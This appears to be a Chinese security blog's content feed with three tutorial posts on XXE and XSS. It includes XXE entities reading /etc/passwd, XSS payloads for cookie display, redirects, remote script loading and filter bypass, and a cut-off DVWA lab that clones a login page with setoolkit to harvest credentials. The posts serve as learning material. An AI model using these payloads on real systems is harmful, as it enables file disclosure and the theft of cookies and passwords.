class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>m0re<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>best xml<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Do you know xml?<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以通过浏览器访问来检查一下上面的规则。比如标签的字母大小写修改一下还能不能和解析成功。</p><h3 id="实体引用："><a href="#实体引用：" class="headerlink" title="实体引用："></a>实体引用：</h3><p><img src="https://img-blog.csdnimg.cn/202007251045012.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>实体引用是因为在浏览器中直接使用这几个符号可能无法成功打印出来，可能会有歧义，所以就需要实体引用起作用了。</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD的作用是定义XML文档的合法构建模块<br>DTD可以在XML文档内声明，也可以外部引用。<br>DTD的属性如下<br><img src="https://img-blog.csdnimg.cn/20200725183109307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>示例：</p><ol><li>内部声明：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>.<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>m0re<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>best xml<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Do you kmow xml?<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>外部引用<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>m0re<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>best xml<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Do you kmow xml?<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--note.dtd--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>.<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>默认属性值：<br><img src="https://img-blog.csdnimg.cn/20200725183248162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>两种方式是一样的，其实不加<code>&lt;!ELEMENT note (to,from.heading,body)&gt;</code>这个也是可以显示出来相同的内容，这里的例子知识为了说明这两种引用方式一样。<br>这个是本地的，但是如果是允许web引用包含的话，危害就比较大了。</li></ol><p>外部声明默认协议及PHP扩展协议<br><img src="https://img-blog.csdnimg.cn/20200725162723426.png" alt="m0re" loading="lazy"><br>其中PHP支持的伪协议较多。</p><h2 id="XXE文件读取"><a href="#XXE文件读取" class="headerlink" title="XXE文件读取"></a>XXE文件读取</h2><p>通过XML写入命令，提交XML可在存在XXE漏洞的环境中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mail</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">mail</span> (<span class="meta-keyword">message</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mail</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mail</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;!ENTITY hacker SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>外部实体说明<br><code>&amp;hacker;</code>是在xml文档中被引用。</p><p>如果题中给了文件路径，那就更容易了，直接读取就可以了。</p><h3 id="xxe-lab"><a href="#xxe-lab" class="headerlink" title="xxe-lab"></a>xxe-lab</h3><p>项目地址——🍗<a href="https://github.com/c0ny1/xxe-lab">传送门</a><br>安装过程出点差错，phpstudy配制出错了，然后搭建的时候报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You don<span class="string">&#x27;t have permission to access /xxe-lab/ on this server.&#x27;</span></span><br></pre></td></tr></table></figure><p>解决办法——🍖<a href="https://blog.csdn.net/qq_39188306/article/details/80682445">已解决</a><br><img src="https://img-blog.csdnimg.cn/20200725150304919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h3 id="XXE简单利用"><a href="#XXE简单利用" class="headerlink" title="XXE简单利用"></a>XXE简单利用</h3><p>一般XXE利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为<code>blind xxe</code>可以使用外带数据通道提取数据<br>xxe-lab是有回显的。<br>查看xxe-lab的PHP源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$USERNAME = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line">$PASSWORD = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line">$result = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">$username = $creds-&gt;username;</span><br><span class="line">$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">$result = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,$username);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$result = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,$username);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)&#123;</span><br><span class="line">$result = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以从这里看出是XXE漏洞注入，而且是POST方式请求。<br>可以抓包查看<br><img src="https://img-blog.csdnimg.cn/20200725173828277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE m0re[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT m0re (<span class="meta-keyword">message</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:/windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>m0re<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使得构造的payload在username输出就行了。<br>结果<br><img src="https://img-blog.csdnimg.cn/20200725174143482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个就是很简单的XXE漏洞利用，读取文件，这个是可以读取任意文件的。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这是对XXE漏洞基础的了解，以后遇到再进行深入学习。✊</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本攻击原理</title>
      <link href="/2020/08/23/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/"/>
      <url>/2020/08/23/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>跨站脚本（cross site script）为了避免与样式CSS混淆，所以简称xss。<br>xss是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。<br>xss是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码，从而盗取用户资料，利用用户身份进行某种动作，或者对访问者进行病毒侵害的一种攻击方式。</p><p>xss攻击的危害包括：<br>1.盗取各类用户账号，如机器登陆账号、用户网银账号、各类管理员账号<br>2.控制企业数据、包括读取、篡改、添加。删除企业敏感数据的能力。<br>3.非法转账，网站挂马，强制发送电子邮件，控制受害者机器向<br>其他网站发起攻击。</p><h3 id="xss主要分类"><a href="#xss主要分类" class="headerlink" title="xss主要分类"></a>xss主要分类</h3><p>反射型XSS（Reflected XSS ），又称为非持久性跨站点脚本攻击，它是最常见类型的xss，漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性xss包含一个带xss攻击向量的链接，（即每次攻击需要用户的点击）。</p><p>存储型XSS（Stored XSS）又称为持久型跨站点攻击脚本，它一般发生在XSS攻击向量（一般指XSS攻击代码）存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久型的XSS相比非持久型的XSS攻击危害更大，因为每当用户打开页面，查看内容时，脚本将自动执行。</p><h1 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h1><p>1.常用HTML标签<br><img src="https://img-blog.csdnimg.cn/20200316231726332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>2.常用JavaScript方法<br><img src="https://img-blog.csdnimg.cn/20200316232703349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>3.构造XSS脚本<br>**<em>弹窗警告**</em><br>此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号，一旦此脚本能执行，也就意味着后端服务器没有对特殊字符做过滤<code>&lt;&gt;    /</code>这样就可以证明，这个页面位置存在了XSS漏洞。我将代码写下来然后展示下在DVWA上的运行结果。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>第一个运行结果成功弹了个窗，上面写着xss<br><img src="https://img-blog.csdnimg.cn/20200318182559780.png" alt="Augenstern" loading="lazy"><br>第二个运行结果能把cookie给显示出来<br><img src="https://img-blog.csdnimg.cn/20200318182913584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>**<em>页面嵌套**</em></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=https:<span class="comment">//zxcv0221.github.io width=300 height=300&gt;&lt;/iframe&gt;</span></span><br><span class="line">&lt;iframe src=https:<span class="comment">//zxcv0221.github.io width=0 height=0 border=0&gt;&lt;/iframe&gt;</span></span><br></pre></td></tr></table></figure><p>第一个运行结果，我是让它跳到了我的GitHub博客去了。<br><img src="https://img-blog.csdnimg.cn/20200318183201453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第二个呢，emmmmmm，我设置嵌套的页面大小是0，所以没有什么变化。<br>**<em>页面重定向**</em></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=<span class="string">&quot;https://zxcv0221.github.io&quot;</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;location.href=<span class="string">&quot;https://zxcv0221.github.io&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>第一个运行结果当然还是我的博客主页，嘿嘿。<img src="https://img-blog.csdnimg.cn/20200318183658902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第二个与第一个运行结果相同。</p><p><strong><em>弹窗警告并重定向</em></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&quot;欢迎来到我的博客网站&quot;</span>);location.href=<span class="string">&quot;https://zxcv0221.github.io&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这个可以弹个窗并加载到我的博客页面。<br><img src="https://img-blog.csdnimg.cn/20200318184004825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里我再点确定就会跳到我的博客。<br>**<em>访问恶意代码**</em></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://*********/xss.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>别看了，这玩意儿我没有，还看。。。。。。。。。。。。。。。。。。。。。。。。。<img src="https://img-blog.csdnimg.cn/20200318184148341.jpg" alt="Augenstern" loading="lazy"><br>**<em>巧用图片标签**</em></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;#&quot;</span> onerror=alert(<span class="string">&#x27;xss&#x27;</span>)&gt;<span class="comment">/*与上面的&lt;script&gt;标签相比有什么优点可以体会一下。嘿嘿*/</span></span><br><span class="line">&lt;img src=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;<span class="comment">/*也可以弹窗*/</span></span><br><span class="line">&lt;img src=<span class="string">&quot;http://**********.***&quot;</span>&gt;&lt;<span class="regexp">/img&gt;/</span>*可以放你想引导到什么网站，可以得到用户cookie，至于放什么照片，照片参数都可以自己设定。*/</span><br></pre></td></tr></table></figure><p><strong><em>绕开过滤的脚本</em></strong><br>大小写：<code>&lt;ScrIpT&gt;alert(&#39;xss&#39;)&lt;/ScRipt&gt;</code><br>字符编码，采用URL、base64等编码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt;小弹窗&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>第二个运行结果：一个超链接<br><img src="https://img-blog.csdnimg.cn/20200319131125875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这上面的都是反射型的xss。<br>存储型的xss危害更大，其危险程度远大于反射型xss。<br>OK，就说到这里。<br>我溜………………</p><p><img src="https://img-blog.csdnimg.cn/20200319134605754.jpg" alt="Augenstern" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS盗取用户信息实验及xss之旅闯关</title>
      <link href="/2020/08/23/XSS%E7%9B%97%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%AE%9E%E9%AA%8C(%E8%AF%A6%E7%BB%86)%E5%8F%8Axss%E4%B9%8B%E6%97%85%E9%97%AF%E5%85%B3/"/>
      <url>/2020/08/23/XSS%E7%9B%97%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%AE%9E%E9%AA%8C(%E8%AF%A6%E7%BB%86)%E5%8F%8Axss%E4%B9%8B%E6%97%85%E9%97%AF%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近段时间学习xss，进行了比较详细的了解，也学了一个小实验，感觉挺有意思，记录下来。然后，后面就是xss之旅的闯关。</p><h1 id="xss盗取用户信息小实验"><a href="#xss盗取用户信息小实验" class="headerlink" title="xss盗取用户信息小实验"></a>xss盗取用户信息小实验</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>DVWA、kali linux、物理机或一台windows系统的虚拟机。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>实验原理：<br>克隆网站登录页面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号和密码被存储。<br>我画的图。咳咳，太丑了，<img src="https://img-blog.csdnimg.cn/20200502173613895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>使用setoolkit工具克隆网站<br>setoolkit是一个kali自带的工具，要在root权限下使用。<br>使用工具克隆好网站后，去靶场插入xss存储型代码。<br>等待用户点击……<br>查看账户密码等信息。</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>打开DVWA，复制一下这个登录页面的url，(这个是个在线的靶场，不知道哪位好心人搭建的。IP就不打码了，想尝试一下的也可以用这个试一下。）<br><img src="https://img-blog.csdnimg.cn/20200502174034632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>登陆进去，先清理一下数据库记录(可有可无)<br><img src="https://img-blog.csdnimg.cn/20200502173931344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>打开kali终端<br>root用户登陆的话就输入 <code>setoolkit</code><br>普通用户就输入<code>sudo setoolkit</code>  回车<br><img src="https://img-blog.csdnimg.cn/20200502174434439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后输入<code>1</code>回车<br>输入<code>2</code>回车<br>输入<code>3</code>回车<br>输入<code>2</code>回车<br>然后出现这样的页面，打码的地方是我的IP地址，<br><img src="https://img-blog.csdnimg.cn/20200502174705691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后敲下回车键，就会提示让输入url，这个时候，将刚复制的DVWA的登录页面的URL输入进去，回车，出现这样的页面<br><img src="https://img-blog.csdnimg.cn/20200502175937153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>下一步打开kali的浏览器，输入我的虚拟机的IP地址，<br><img src="https://img-blog.csdnimg.cn/2020050218011736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>发现是这样的，证明克隆成功。<br>登陆进去，到存储型xss处插入代码<br><code>&lt;script&gt;window.location=&quot;http://***.***.**.***&lt;/script&gt;</code><br>这里有长度限制，就f12改一下。<br><img src="https://img-blog.csdnimg.cn/2020050218065686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后在win7虚拟机上进行登录</p><p><img src="https://img-blog.csdnimg.cn/20200502181803475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" 